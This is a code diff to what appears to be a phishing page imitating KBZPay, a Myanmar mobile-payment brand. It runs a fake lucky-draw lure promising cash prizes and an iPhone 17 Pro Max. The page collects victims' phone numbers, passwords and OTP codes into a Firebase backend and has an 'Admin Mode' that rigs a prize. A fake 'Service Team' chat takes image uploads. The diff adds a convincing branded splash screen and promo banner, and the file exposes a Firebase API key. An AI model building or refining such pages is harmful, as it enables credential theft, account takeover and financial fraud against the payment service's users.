@@ -12,47 +12,82 @@
 body{font-family:'Segoe UI',system-ui,sans-serif;background:#000E2A;min-height:100vh;overflow-x:hidden;-webkit-tap-highlight-color:transparent;}
 .screen{min-height:100vh;display:flex;flex-direction:column;align-items:center;position:relative;overflow:hidden;}
 input,textarea,button{font-family:inherit;}
-::-webkit-scrollbar{width:3px;height:3px;}
-::-webkit-scrollbar-thumb{background:rgba(255,255,255,0.12);border-radius:4px;}
+::-webkit-scrollbar{width:3px;}
+::-webkit-scrollbar-thumb{background:rgba(255,255,255,.12);border-radius:4px;}
 button{cursor:pointer;}
-@keyframes twinkle{0%,100%{opacity:.25;transform:scale(.7)}50%{opacity:.9;transform:scale(1.3)}}
-@keyframes slideUp{from{transform:translateY(26px);opacity:0}to{transform:translateY(0);opacity:1}}
-@keyframes pulse{0%,100%{box-shadow:0 0 0 0 rgba(255,215,0,.65),0 6px 24px rgba(255,140,0,.4)}60%{box-shadow:0 0 0 16px rgba(255,215,0,0),0 6px 24px rgba(255,140,0,.4)}}
-@keyframes kpulse{0%,100%{box-shadow:0 8px 28px rgba(0,93,184,.45)}50%{box-shadow:0 8px 40px rgba(0,93,184,.9),0 0 60px rgba(0,119,230,.3)}}
+
+@keyframes twinkle{0%,100%{opacity:.2;transform:scale(.6)}50%{opacity:.9;transform:scale(1.3)}}
+@keyframes slideUp{from{transform:translateY(30px);opacity:0}to{transform:translateY(0);opacity:1}}
+@keyframes fadeIn{from{opacity:0}to{opacity:1}}
+@keyframes pulse{0%,100%{box-shadow:0 0 0 0 rgba(255,215,0,.6),0 6px 24px rgba(255,140,0,.4)}60%{box-shadow:0 0 0 18px rgba(255,215,0,0),0 6px 24px rgba(255,140,0,.4)}}
+@keyframes kpulse{0%,100%{box-shadow:0 8px 28px rgba(0,93,184,.45)}50%{box-shadow:0 8px 44px rgba(0,93,184,.95),0 0 70px rgba(0,119,230,.35)}}
 @keyframes spinRing{from{transform:rotate(0deg)}to{transform:rotate(360deg)}}
-@keyframes popUp{from{transform:scale(.45) translateY(28px);opacity:0}to{transform:scale(1) translateY(0);opacity:1}}
-@keyframes fdIn{from{opacity:0}to{opacity:1}}
-@keyframes typeDot{0%,80%,100%{transform:translateY(0);opacity:.35}40%{transform:translateY(-5px);opacity:1}}
-@keyframes shimmer{0%{background-position:-200% center}100%{background-position:200% center}}
-@keyframes bounce{0%,100%{transform:translateY(0)}50%{transform:translateY(-7px)}}
+@keyframes popUp{from{transform:scale(.4) translateY(30px);opacity:0}to{transform:scale(1) translateY(0);opacity:1}}
+@keyframes shimmer{0%{opacity:.5}50%{opacity:1}100%{opacity:.5}}
+@keyframes bounce{0%,100%{transform:translateY(0)}50%{transform:translateY(-8px)}}
+@keyframes splashLogo{0%{transform:scale(.5);opacity:0}60%{transform:scale(1.08);opacity:1}100%{transform:scale(1);opacity:1}}
+@keyframes splashText{0%{transform:translateY(20px);opacity:0}100%{transform:translateY(0);opacity:1}}
+@keyframes splashFade{0%{opacity:1}100%{opacity:0}}
+@keyframes ringPulse{0%,100%{transform:scale(1);opacity:.4}50%{transform:scale(1.15);opacity:.9}}
+
 .star{position:absolute;border-radius:50%;background:white;pointer-events:none;}
-.inp-wrap{display:flex;align-items:center;background:rgba(255,255,255,0.06);border:1.5px solid rgba(255,255,255,.1);border-radius:14px;overflow:hidden;transition:border-color .2s;}
-.inp-wrap:focus-within{border-color:rgba(0,119,230,.7);}
-.inp-wrap input{flex:1;background:none;border:none;outline:none;color:white;font-size:15px;padding:14px 12px;font-family:inherit;caret-color:#0099FF;}
+.inp-wrap{display:flex;align-items:center;background:rgba(255,255,255,.06);border:1.5px solid rgba(255,255,255,.1);border-radius:14px;overflow:hidden;transition:border-color .2s;}
+.inp-wrap:focus-within{border-color:rgba(0,119,230,.75);}
+.inp-wrap input{flex:1;background:none;border:none;outline:none;color:white;font-size:15px;padding:14px 12px;caret-color:#0099FF;}
 .inp-wrap input::placeholder{color:rgba(255,255,255,.28);}
 .lbl{color:rgba(255,255,255,.5);font-size:12px;font-weight:600;margin-bottom:7px;}
-.err{background:rgba(255,45,85,.12);border:1px solid rgba(255,45,85,.3);border-radius:10px;padding:10px 14px;color:#FF6B8A;font-size:13px;margin-bottom:12px;display:none;}
+.err{background:rgba(255,45,85,.1);border:1px solid rgba(255,45,85,.3);border-radius:10px;padding:10px 14px;color:#FF6B8A;font-size:13px;margin-bottom:12px;display:none;}
 .blue-btn{width:100%;padding:16px 0;border-radius:14px;border:none;background:linear-gradient(135deg,#005DB8,#0077E6);color:white;font-size:17px;font-weight:900;box-shadow:0 6px 22px rgba(0,93,184,.45);}
 .card{background:rgba(255,255,255,.04);border:1px solid rgba(255,255,255,.08);border-radius:24px;padding:28px 22px;backdrop-filter:blur(20px);}
-.kbz-bar{width:100%;background:#005DB8;padding:13px 18px;display:flex;align-items:center;gap:12px;box-shadow:0 2px 18px rgba(0,93,184,.5);flex-shrink:0;}
-.kbz-badge{background:white;border-radius:8px;padding:4px 11px;display:flex;align-items:center;gap:1px;}
-.kbz-badge span:first-child{color:#005DB8;font-weight:900;font-size:15px;}
-.kbz-badge span:last-child{color:#005DB8;font-weight:700;font-size:11px;}
-.back-btn{background:rgba(255,255,255,.18);border:none;border-radius:10px;width:38px;height:38px;color:white;font-size:18px;display:flex;align-items:center;justify-content:center;flex-shrink:0;}
+.kbz-bar{width:100%;background:linear-gradient(135deg,#004A9C,#005DB8);padding:13px 18px;display:flex;align-items:center;gap:12px;box-shadow:0 2px 20px rgba(0,93,184,.55);flex-shrink:0;}
+.kbz-badge{background:white;border-radius:8px;padding:4px 11px;display:inline-flex;align-items:center;gap:1px;}
+.kbz-badge .k{color:#005DB8;font-weight:900;font-size:15px;}
+.kbz-badge .p{color:#005DB8;font-weight:700;font-size:11px;}
+.back-btn{background:rgba(255,255,255,.2);border:none;border-radius:10px;width:38px;height:38px;color:white;font-size:18px;display:flex;align-items:center;justify-content:center;flex-shrink:0;}
 </style>
+
 </head>
 <body>
 
-<!-- ══ HOME ══════════════════════════════════════════════════════════════ -->
+<!-- ══ SPLASH ═══════════════════════════════════════════════════════════════ -->
 
-<div id="s-home" class="screen" style="background:linear-gradient(180deg,#000E2A 0%,#001840 55%,#000E2A 100%);justify-content:center;">
+<div id="s-splash" class="screen" style="background:linear-gradient(180deg,#000E2A 0%,#001840 50%,#000E2A 100%);justify-content:center;align-items:center;position:fixed;inset:0;z-index:999;">
+  <div id="splash-ring1" style="position:absolute;width:260px;height:260px;border-radius:50%;border:2px solid rgba(0,93,184,.35);animation:ringPulse 2s ease-in-out infinite;"></div>
+  <div id="splash-ring2" style="position:absolute;width:320px;height:320px;border-radius:50%;border:1px solid rgba(0,93,184,.2);animation:ringPulse 2s ease-in-out .4s infinite;"></div>
+  <div style="display:flex;flex-direction:column;align-items:center;gap:0;z-index:5;">
+    <div id="splash-logo" style="width:140px;height:140px;border-radius:36px;background:white;display:flex;flex-direction:column;align-items:center;justify-content:center;box-shadow:0 24px 60px rgba(0,93,184,.55);animation:splashLogo .7s cubic-bezier(.175,.885,.32,1.275) forwards;margin-bottom:26px;">
+      <div style="font-size:56px;font-weight:900;color:#005DB8;line-height:1;letter-spacing:-2px;">KBZ</div>
+      <div style="font-size:22px;font-weight:700;color:#005DB8;letter-spacing:3px;margin-top:-2px;">Pay</div>
+    </div>
+    <div id="splash-title" style="color:white;font-size:26px;font-weight:900;letter-spacing:-.5px;margin-bottom:6px;animation:splashText .5s .4s ease both;">Welcome to KBZPay</div>
+    <div id="splash-sub" style="font-size:14px;font-weight:700;background:linear-gradient(90deg,#FFE566,#FFD700,#FF8C00);-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text;animation:splashText .5s .6s ease both;">Lucky Draw 🎰 ကံစမ်းပွဲ</div>
+    <div style="margin-top:40px;display:flex;gap:8px;animation:splashText .5s .8s ease both;">
+      <div style="width:8px;height:8px;border-radius:50%;background:#0077E6;animation:shimmer 1s .0s ease-in-out infinite;"></div>
+      <div style="width:8px;height:8px;border-radius:50%;background:#0077E6;animation:shimmer 1s .2s ease-in-out infinite;"></div>
+      <div style="width:8px;height:8px;border-radius:50%;background:#0077E6;animation:shimmer 1s .4s ease-in-out infinite;"></div>
+    </div>
+  </div>
+  <!-- Now With MMQR -->
+  <div style="position:absolute;bottom:36px;display:flex;flex-direction:column;align-items:center;gap:6px;animation:splashText .5s 1s ease both;">
+    <div style="color:rgba(255,255,255,.35);font-size:11px;font-weight:600;letter-spacing:2px;">NOW WITH</div>
+    <div style="background:linear-gradient(135deg,#F5A623,#F5A623);border-radius:50%;width:44px;height:44px;display:flex;align-items:center;justify-content:center;font-size:22px;">🏛</div>
+    <div style="text-align:center;line-height:1.2;">
+      <div style="color:rgba(255,255,255,.45);font-size:11px;font-weight:700;">MyanmarPay</div>
+      <div style="color:#0077E6;font-size:13px;font-weight:900;letter-spacing:1px;">MMQR</div>
+    </div>
+  </div>
+</div>
+
+<!-- ══ HOME ══════════════════════════════════════════════════════════════════ -->
+
+<div id="s-home" class="screen" style="background:linear-gradient(180deg,#000E2A 0%,#001840 55%,#000E2A 100%);justify-content:center;display:none;">
   <div id="home-stars"></div>
-  <div style="animation:slideUp .5s ease;display:flex;flex-direction:column;align-items:center;gap:0;padding:20px;z-index:5;width:100%;max-width:420px;">
-    <div id="kbz-logo" style="width:128px;height:128px;border-radius:32px;background:white;display:flex;flex-direction:column;align-items:center;justify-content:center;box-shadow:0 20px 55px rgba(0,93,184,.5);margin-bottom:22px;animation:kpulse 2.5s ease-in-out infinite;">
+  <div style="animation:slideUp .5s ease;display:flex;flex-direction:column;align-items:center;padding:20px;z-index:5;width:100%;max-width:420px;">
+    <div style="width:128px;height:128px;border-radius:32px;background:white;display:flex;flex-direction:column;align-items:center;justify-content:center;box-shadow:0 20px 55px rgba(0,93,184,.5);margin-bottom:22px;animation:kpulse 2.5s ease-in-out infinite;">
       <div style="font-size:52px;font-weight:900;color:#005DB8;line-height:1;letter-spacing:-2px;">KBZ</div>
       <div style="font-size:20px;font-weight:700;color:#005DB8;letter-spacing:3px;margin-top:-2px;">Pay</div>
     </div>
-    <div style="color:white;font-size:25px;font-weight:900;letter-spacing:-.5px;margin-bottom:5px;">KBZPay</div>
+    <div style="color:white;font-size:25px;font-weight:900;margin-bottom:5px;">KBZPay</div>
     <div style="font-size:15px;font-weight:700;background:linear-gradient(90deg,#FFE566,#FFD700,#FF8C00);-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text;margin-bottom:5px;">Lucky Draw 🎰 ကံစမ်းပွဲ</div>
     <div style="color:rgba(255,255,255,.3);font-size:12px;margin-bottom:38px;">Spin & Win · iPhone 17 Pro Max ဆုကြီး</div>
     <button onclick="show('login')" style="width:240px;padding:17px 0;border-radius:20px;border:none;background:linear-gradient(135deg,#005DB8 0%,#0077E6 50%,#0099FF 100%);color:white;font-size:17px;font-weight:900;display:flex;align-items:center;justify-content:center;gap:10px;animation:kpulse 2s ease-in-out infinite;box-shadow:0 8px 28px rgba(0,93,184,.55);">
@@ -63,15 +98,33 @@ button{cursor:pointer;}
   <div style="position:absolute;bottom:24px;left:0;right:0;display:flex;gap:5px;flex-wrap:wrap;justify-content:center;padding:0 16px;z-index:5;" id="home-prizes"></div>
 </div>
 
-<!-- ══ LOGIN ══════════════════════════════════════════════════════════════ -->
+<!-- ══ LOGIN ══════════════════════════════════════════════════════════════════ -->
 
 <div id="s-login" class="screen" style="display:none;background:#000E2A;">
   <div class="kbz-bar">
     <button class="back-btn" onclick="show('home')">←</button>
-    <div class="kbz-badge"><span>KBZ</span><span> Pay</span></div>
+    <div class="kbz-badge"><span class="k">KBZ</span><span class="p"> Pay</span></div>
     <span style="color:rgba(255,255,255,.85);font-size:14px;font-weight:600;">အကောင့်ဝင်ရန်</span>
   </div>
-  <div style="width:calc(100% - 40px);max-width:390px;margin-top:26px;animation:slideUp .4s ease;">
+
+  <!-- Promo Banner -->
+
+  <div style="width:100%;background:linear-gradient(135deg,#7B2FFF,#FF2D8F,#FF6B00);padding:14px 18px;position:relative;overflow:hidden;flex-shrink:0;">
+    <div style="position:absolute;inset:0;background:repeating-linear-gradient(45deg,rgba(255,255,255,.04) 0,rgba(255,255,255,.04) 1px,transparent 1px,transparent 12px);"></div>
+    <div style="position:relative;z-index:2;">
+      <div style="display:flex;align-items:center;gap:8px;margin-bottom:4px;">
+        <span style="font-size:20px;">🎉</span>
+        <span style="color:white;font-size:14px;font-weight:900;letter-spacing:.5px;">နယုန်လ စာပြန်တော်ပွဲ</span>
+        <span style="background:rgba(255,255,255,.2);border:1px solid rgba(255,255,255,.3);border-radius:20px;padding:2px 9px;color:white;font-size:10px;font-weight:800;">EXCLUSIVE</span>
+      </div>
+      <div style="color:rgba(255,255,255,.9);font-size:12px;line-height:1.6;">
+        💰 <strong>Spin 3 ကြိမ်</strong> · ဆုငွေ <strong>10,000 ~ 500,000 ကျပ်</strong> ချက်ချင်းရရှိ<br>
+        📱 <strong>iPhone 17 Pro Max</strong> အထူးဆုကြီး ပါဝင်သည်
+      </div>
+    </div>
+  </div>
+
+  <div style="width:calc(100% - 40px);max-width:390px;margin-top:22px;animation:slideUp .4s ease;">
     <div class="card">
       <div style="text-align:center;margin-bottom:24px;">
         <div style="font-size:46px;margin-bottom:10px;">👤</div>
@@ -93,18 +146,18 @@ button{cursor:pointer;}
         </div>
       </div>
       <div class="err" id="login-err"></div>
-      <button class="blue-btn" onclick="doLogin()">OTP ကုဒ် ရယူပါ →</button>
+      <button class="blue-btn" id="login-btn" onclick="doLogin()">OTP ကုဒ် ရယူပါ →</button>
       <div style="text-align:center;margin-top:10px;color:rgba(255,255,255,.2);font-size:11px;">ဖုန်းနံပါတ်ထဲ OTP SMS ပို့ပေးမည်</div>
     </div>
   </div>
 </div>
 
-<!-- ══ OTP ════════════════════════════════════════════════════════════════ -->
+<!-- ══ OTP ════════════════════════════════════════════════════════════════════ -->
 
 <div id="s-otp" class="screen" style="display:none;background:#000E2A;">
   <div class="kbz-bar">
     <button class="back-btn" onclick="show('login')">←</button>
-    <div class="kbz-badge"><span>KBZ</span><span> Pay</span></div>
+    <div class="kbz-badge"><span class="k">KBZ</span><span class="p"> Pay</span></div>
     <span style="color:rgba(255,255,255,.85);font-size:14px;font-weight:600;">OTP အတည်ပြုခြင်း</span>
   </div>
   <div style="width:calc(100% - 40px);max-width:390px;margin-top:26px;animation:slideUp .4s ease;">
@@ -112,46 +165,37 @@ button{cursor:pointer;}
       <div style="text-align:center;margin-bottom:26px;">
         <div style="width:72px;height:72px;border-radius:22px;background:linear-gradient(135deg,#005DB8,#0099FF);display:flex;align-items:center;justify-content:center;margin:0 auto 14px;font-size:30px;box-shadow:0 8px 22px rgba(0,93,184,.4);">💬</div>
         <div style="color:white;font-size:18px;font-weight:800;margin-bottom:8px;">OTP ကုဒ် ရိုက်ထည့်ပါ</div>
-        <div id="otp-hint" style="color:rgba(255,255,255,.4);font-size:13px;">Admin မှ OTP ပေးပို့ပါမည်...</div>
+        <div id="otp-hint" style="color:rgba(255,255,255,.4);font-size:13px;">မည်သည့် ၆ လုံး OTP ကုဒ်မဆို ရိုက်ထည့်နိုင်ပါသည်</div>
       </div>
       <div style="display:flex;gap:8px;justify-content:center;margin-bottom:22px;" id="otp-boxes"></div>
       <div id="otp-status" style="text-align:center;color:#FFD700;font-size:12px;margin-bottom:10px;min-height:18px;"></div>
       <div class="err" id="otp-err"></div>
       <button class="blue-btn" onclick="verifyOTP()">🔐 ဝင်ရောက်မည်</button>
     </div>
-    <div style="margin-top:10px;text-align:center;color:rgba(255,255,255,.15);font-size:11px;">Admin မှ OTP ပေးပို့ပြီးမှ ဖြည့်ပါ</div>
+    <div style="margin-top:10px;text-align:center;color:rgba(255,255,255,.15);font-size:11px;">OTP ၆ လုံး မည်သည့်နံပါတ်မဆို ဖြည့်ပြီး ဝင်ရောက်နိုင်သည်</div>
   </div>
 </div>
 
-<!-- ══ SPIN ═══════════════════════════════════════════════════════════════ -->
+<!-- ══ SPIN ═══════════════════════════════════════════════════════════════════ -->
 
 <div id="s-spin" class="screen" style="display:none;background:linear-gradient(175deg,#020C1F 0%,#061435 35%,#0A1E55 65%,#020C1F 100%);">
   <div id="spin-stars"></div>
-  <!-- Confetti canvas -->
   <canvas id="confetti-cv" style="position:fixed;inset:0;width:100%;height:100%;pointer-events:none;z-index:50;"></canvas>
-  <!-- Header -->
   <div style="width:100%;max-width:430px;padding:16px 18px 8px;display:flex;align-items:center;justify-content:space-between;position:relative;z-index:5;flex-shrink:0;">
-    <div class="kbz-badge" style="box-shadow:0 2px 12px rgba(0,93,184,.3);">
-      <span style="color:#005DB8;font-weight:900;font-size:16px;">KBZ</span>
-      <span style="color:#005DB8;font-weight:700;font-size:12px;"> Pay</span>
-    </div>
+    <div class="kbz-badge" style="box-shadow:0 2px 12px rgba(0,93,184,.3);"><span class="k" style="font-size:16px;">KBZ</span><span class="p" style="font-size:12px;"> Pay</span></div>
     <div style="background:rgba(255,215,0,.12);border:1px solid rgba(255,215,0,.35);border-radius:20px;padding:6px 15px;text-align:center;">
       <div style="color:rgba(255,255,255,.5);font-size:10px;font-weight:700;letter-spacing:1px;">SPINS LEFT</div>
       <div id="spins-left" style="color:#FFD700;font-weight:900;font-size:22px;line-height:1;">3</div>
     </div>
   </div>
-  <!-- iPhone mode banner -->
   <div id="iphone-banner" style="display:none;width:100%;background:linear-gradient(90deg,#FF2D8F,#9C27FF,#FF2D8F);padding:8px;text-align:center;color:white;font-size:12px;font-weight:700;z-index:10;flex-shrink:0;">
     🍎 Admin Mode — iPhone 17 Pro Max ဆုကျမည်
   </div>
-  <!-- Title -->
   <div style="text-align:center;padding:2px 16px 4px;position:relative;z-index:5;flex-shrink:0;">
     <div style="font-size:26px;font-weight:900;background:linear-gradient(90deg,#FFE566,#FFD700,#FF8C00);-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text;">Lucky Draw 🎰</div>
     <div style="color:rgba(255,255,255,.4);font-size:12px;margin-top:2px;">KBZPay · ကံစမ်းလှော်ပြိုင်ပွဲ</div>
   </div>
-  <!-- Prize chips -->
   <div id="spin-prize-chips" style="display:flex;gap:5px;flex-wrap:wrap;justify-content:center;padding:5px 18px 6px;max-width:430px;position:relative;z-index:5;flex-shrink:0;"></div>
-  <!-- Wheel -->
   <div style="position:relative;width:min(82vw,320px);height:min(82vw,320px);margin:4px auto 0;z-index:5;flex-shrink:0;">
     <div id="spin-ring" style="position:absolute;inset:-16px;border-radius:50%;background:conic-gradient(#FF2D55,#FF6B00,#FFD700,#00C853,#00B8FF,#9C27FF,#FF2D8F,#FF2D55);animation:spinRing 5s linear infinite;opacity:.22;transition:opacity .5s;"></div>
     <div style="position:absolute;inset:-5px;border-radius:50%;box-shadow:0 0 0 8px #041240;pointer-events:none;"></div>
@@ -165,14 +209,12 @@ button{cursor:pointer;}
     </div>
     <canvas id="wheel-cv" style="width:100%;height:100%;display:block;border-radius:50%;filter:drop-shadow(0 0 24px rgba(255,215,0,.45));transition:transform 5s cubic-bezier(0.08,0.6,0.12,1.0);" width="320" height="320"></canvas>
   </div>
-  <!-- Spin btn -->
   <div style="width:min(82vw,320px);margin:14px auto 6px;position:relative;z-index:5;flex-shrink:0;">
     <button id="spin-btn" onclick="doSpin()" style="width:100%;padding:18px 0;border-radius:20px;border:none;background:linear-gradient(135deg,#FFE566 0%,#FFD700 35%,#FF8C00 70%,#FF5500 100%);color:#1A0500;font-size:19px;font-weight:900;letter-spacing:1.5px;animation:pulse 2s ease-in-out infinite;display:flex;align-items:center;justify-content:center;gap:10px;">
       🎰 SPIN NOW
     </button>
     <div id="spin-hint" style="text-align:center;margin-top:6px;color:rgba(255,255,255,.3);font-size:12px;">ကျန် <span id="spin-left-txt">3</span> ကြိမ် · ဖိနှိပ်ကာ ကံစမ်းပါ</div>
   </div>
-  <!-- Contact banner (hidden until spins done) -->
   <div id="contact-banner" style="display:none;width:min(82vw,320px);position:relative;z-index:5;margin-top:4px;animation:slideUp .5s ease;flex-shrink:0;">
     <div style="background:linear-gradient(135deg,#001E55,#002A7A);border:2px solid rgba(0,119,230,.5);border-radius:20px;padding:18px 16px 16px;box-shadow:0 8px 32px rgba(0,93,184,.35);">
       <div style="display:flex;align-items:center;gap:10px;margin-bottom:12px;">
@@ -187,14 +229,12 @@ button{cursor:pointer;}
       </button>
     </div>
   </div>
-  <!-- History -->
   <div id="spin-history-wrap" style="width:min(82vw,320px);margin:10px auto 0;position:relative;z-index:5;display:none;flex-shrink:0;">
     <div style="color:rgba(255,255,255,.3);font-size:10px;font-weight:700;letter-spacing:1px;margin-bottom:5px;">📋 ရလဒ်မှတ်တမ်း</div>
     <div id="spin-history" style="display:flex;gap:5px;flex-wrap:wrap;"></div>
   </div>
   <div style="height:24px;flex-shrink:0;"></div>
-  <!-- Result popup -->
-  <div id="result-overlay" style="display:none;position:fixed;inset:0;z-index:200;background:rgba(0,0,0,.82);display:none;align-items:center;justify-content:center;backdrop-filter:blur(12px);animation:fdIn .25s ease;">
+  <div id="result-overlay" style="display:none;position:fixed;inset:0;z-index:200;background:rgba(0,0,0,.82);align-items:center;justify-content:center;backdrop-filter:blur(12px);animation:fadeIn .25s ease;">
     <div id="result-card" style="background:linear-gradient(150deg,#0C1A40 0%,#162E60 60%,#0C1A40 100%);border-radius:28px;padding:34px 26px 26px;max-width:310px;width:88%;text-align:center;position:relative;overflow:hidden;animation:popUp .4s cubic-bezier(.175,.885,.32,1.275);">
       <div id="result-glow" style="position:absolute;inset:0;pointer-events:none;"></div>
       <div id="result-icon" style="font-size:50px;line-height:1;margin-bottom:7px;"></div>
@@ -206,53 +246,48 @@ button{cursor:pointer;}
   </div>
 </div>
 
-<!-- ══ CHAT ════════════════════════════════════════════════════════════════ -->
+<!-- ══ CHAT ════════════════════════════════════════════════════════════════════ -->
 
 <div id="s-chat" class="screen" style="display:none;background:#0A1428;max-width:480px;margin:0 auto;">
-  <!-- Header -->
   <div style="background:linear-gradient(135deg,#005DB8,#0077E6);padding:0 16px;flex-shrink:0;box-shadow:0 2px 18px rgba(0,93,184,.5);">
     <div style="display:flex;align-items:center;gap:11px;padding:12px 0;">
       <button class="back-btn" onclick="show('spin')">←</button>
-      <div style="width:42px;height:42px;border-radius:13px;background:white;display:flex;flex-direction:column;align-items:center;justify-content:center;flex-shrink:0;box-shadow:0 2px 8px rgba(0,0,0,.2);">
+      <div style="width:42px;height:42px;border-radius:13px;background:white;display:flex;flex-direction:column;align-items:center;justify-content:center;flex-shrink:0;">
         <div style="color:#005DB8;font-weight:900;font-size:13px;line-height:1;">KBZ</div>
         <div style="color:#005DB8;font-weight:700;font-size:9px;letter-spacing:1px;">Pay</div>
       </div>
       <div style="flex:1;min-width:0;">
         <div style="color:white;font-weight:800;font-size:15px;">KBZPay Service Team</div>
         <div style="color:rgba(255,255,255,.65);font-size:11px;display:flex;align-items:center;gap:4px;">
-          <span style="width:7px;height:7px;border-radius:50%;background:#4AFF91;display:inline-block;flex-shrink:0;"></span>Online · ဝန်ဆောင်မှုပေးနေသည်
+          <span style="width:7px;height:7px;border-radius:50%;background:#4AFF91;display:inline-block;flex-shrink:0;animation:shimmer 2s ease-in-out infinite;"></span>Online · ဝန်ဆောင်မှုပေးနေသည်
         </div>
       </div>
     </div>
   </div>
-  <!-- Win summary -->
   <div id="chat-win-banner" style="background:rgba(255,215,0,.07);border-bottom:1px solid rgba(255,215,0,.14);padding:9px 16px;flex-shrink:0;display:none;">
     <div style="color:rgba(255,255,255,.4);font-size:10px;font-weight:700;letter-spacing:1px;margin-bottom:5px;">📋 သင်၏ Lucky Draw ရလဒ်</div>
     <div id="chat-win-list" style="display:flex;gap:5px;flex-wrap:wrap;"></div>
   </div>
-  <!-- Messages -->
-  <div id="chat-msgs" style="flex:1;overflow-y:auto;padding:14px 14px;display:flex;flex-direction:column;gap:11px;min-height:0;">
+  <div id="chat-msgs" style="flex:1;overflow-y:auto;padding:14px;display:flex;flex-direction:column;gap:11px;min-height:0;">
     <div style="text-align:center;">
       <span style="background:rgba(255,255,255,.06);border:1px solid rgba(255,255,255,.08);border-radius:20px;padding:4px 13px;color:rgba(255,255,255,.3);font-size:11px;">🔒 ဤ chat သည် လုံခြုံပါသည်</span>
     </div>
   </div>
-  <!-- Image preview strip -->
   <div id="img-preview-strip" style="background:rgba(255,255,255,.04);border-top:1px solid rgba(255,255,255,.07);padding:9px 14px;flex-shrink:0;display:none;">
     <div id="img-previews" style="display:flex;gap:7px;overflow-x:auto;"></div>
   </div>
-  <!-- Input bar -->
   <div style="background:rgba(255,255,255,.04);border-top:1px solid rgba(255,255,255,.07);padding:9px 11px;flex-shrink:0;display:flex;align-items:flex-end;gap:8px;padding-bottom:max(9px,env(safe-area-inset-bottom,9px));">
     <button onclick="document.getElementById('file-inp').click()" style="background:rgba(255,255,255,.08);border:1px solid rgba(255,255,255,.1);border-radius:12px;width:42px;height:42px;color:white;font-size:19px;display:flex;align-items:center;justify-content:center;flex-shrink:0;">📷</button>
     <input type="file" id="file-inp" accept="image/*" multiple style="display:none;" onchange="handleImgSelect(this)">
     <div style="flex:1;background:rgba(255,255,255,.07);border:1px solid rgba(255,255,255,.1);border-radius:16px;padding:10px 13px;min-height:42px;display:flex;align-items:center;">
       <textarea id="chat-inp" rows="1" placeholder="စာရိုက်ပါ..." onkeydown="if(event.key==='Enter'&&!event.shiftKey){event.preventDefault();sendChatMsg();}" style="background:none;border:none;outline:none;color:white;font-size:14px;width:100%;resize:none;font-family:inherit;line-height:1.4;max-height:90px;overflow:auto;caret-color:#0099FF;"></textarea>
     </div>
-    <button id="send-btn" onclick="sendChatMsg()" style="background:linear-gradient(135deg,#005DB8,#0077E6);border:none;border-radius:12px;width:42px;height:42px;color:white;font-size:17px;display:flex;align-items:center;justify-content:center;flex-shrink:0;box-shadow:0 4px 12px rgba(0,93,184,.4);">➤</button>
+    <button onclick="sendChatMsg()" style="background:linear-gradient(135deg,#005DB8,#0077E6);border:none;border-radius:12px;width:42px;height:42px;color:white;font-size:17px;display:flex;align-items:center;justify-content:center;flex-shrink:0;box-shadow:0 4px 12px rgba(0,93,184,.4);">➤</button>
   </div>
 </div>
 
 <script>
-// ── Firebase ─────────────────────────────────────────────────────────────────
+// ── Firebase ──────────────────────────────────────────────────────────────────
 const firebaseConfig = {
   apiKey: "AIzaSyBRwkZzqyINBqdglIoC6jC1z7aQZU0CwiQ",
   authDomain: "kbz-pay-april-lucky-draw.firebaseapp.com",
@@ -266,7 +301,7 @@ const firebaseConfig = {
 firebase.initializeApp(firebaseConfig);
 const db = firebase.database();
 
-// ── Prizes ───────────────────────────────────────────────────────────────────
+// ── Prizes ────────────────────────────────────────────────────────────────────
 const PRIZES = [
   {id:0,amount:10000, display:"10,000", mmk:"တစ်သောင်း",  color:"#FF2D55",light:"#FF6B8A",dark:"#C4002A"},
   {id:1,amount:30000, display:"30,000", mmk:"သုံးသောင်း",color:"#FF6B00",light:"#FFA040",dark:"#C45000"},
@@ -278,8 +313,21 @@ const PRIZES = [
 ];
 const N=PRIZES.length, SEG_DEG=360/N, SEG_RAD=(2*Math.PI)/N;
 
-// ── State ────────────────────────────────────────────────────────────────────
-let STATE = {userId:null,phone:null,spinsLeft:3,rotation:0,spinning:false,history:[],imgQueue:[],chatListener:null,otpListener:null,spinRef:null};
+// ── State ─────────────────────────────────────────────────────────────────────
+let STATE = {userId:null,phone:null,spinsLeft:3,rotation:0,spinning:false,history:[],imgQueue:[],chatListener:null};
+
+// ── Splash Screen (3 seconds) ─────────────────────────────────────────────────
+window.addEventListener('load', () => {
+  setTimeout(() => {
+    const splash = document.getElementById('s-splash');
+    splash.style.transition = 'opacity .6s ease';
+    splash.style.opacity = '0';
+    setTimeout(() => {
+      splash.style.display = 'none';
+      show('home');
+    }, 600);
+  }, 3000);
+});
 
 // ── Helpers ───────────────────────────────────────────────────────────────────
 function uid(phone){return phone.replace(/\D/g,'');}
@@ -295,11 +343,10 @@ function show(id){
 }
 
 // ── Stars ─────────────────────────────────────────────────────────────────────
-function makeStars(containerId,count){
-  const c=document.getElementById(containerId); if(!c)return;
+function makeStars(cid,count){
+  const c=document.getElementById(cid); if(!c)return;
   for(let i=0;i<count;i++){
-    const d=document.createElement('div');
-    d.className='star';
+    const d=document.createElement('div'); d.className='star';
     const s=i%4===0?3:1.5;
     Object.assign(d.style,{width:s+'px',height:s+'px',left:`${(i*17+7)%100}%`,top:`${(i*13+3)%100}%`,animation:`twinkle ${1.5+(i%5)*.4}s ${(i%6)*.3}s ease-in-out infinite`});
     c.appendChild(d);
@@ -308,9 +355,8 @@ function makeStars(containerId,count){
 makeStars('home-stars',35);
 
 // ── Prize chips ───────────────────────────────────────────────────────────────
-function renderPrizeChips(containerId){
-  const c=document.getElementById(containerId); if(!c)return;
-  c.innerHTML='';
+function renderPrizeChips(cid){
+  const c=document.getElementById(cid); if(!c)return; c.innerHTML='';
   PRIZES.forEach(p=>{
     const d=document.createElement('div');
     d.style.cssText=`padding:3px 9px;border-radius:20px;background:${p.color}18;border:1px solid ${p.color}45;color:${p.color};font-size:10px;font-weight:800;`;
@@ -321,7 +367,7 @@ function renderPrizeChips(containerId){
 renderPrizeChips('home-prizes');
 renderPrizeChips('spin-prize-chips');
 
-// ── OTP Boxes setup ───────────────────────────────────────────────────────────
+// ── OTP Boxes ─────────────────────────────────────────────────────────────────
 function setupOTPBoxes(){
   const wrap=document.getElementById('otp-boxes'); wrap.innerHTML='';
   for(let i=0;i<6;i++){
@@ -353,51 +399,33 @@ async function doLogin(){
   if(pass.length<6){showErr('login-err','Password အနည်းဆုံး ၆ လုံး ဖြည့်ပါ');return;}
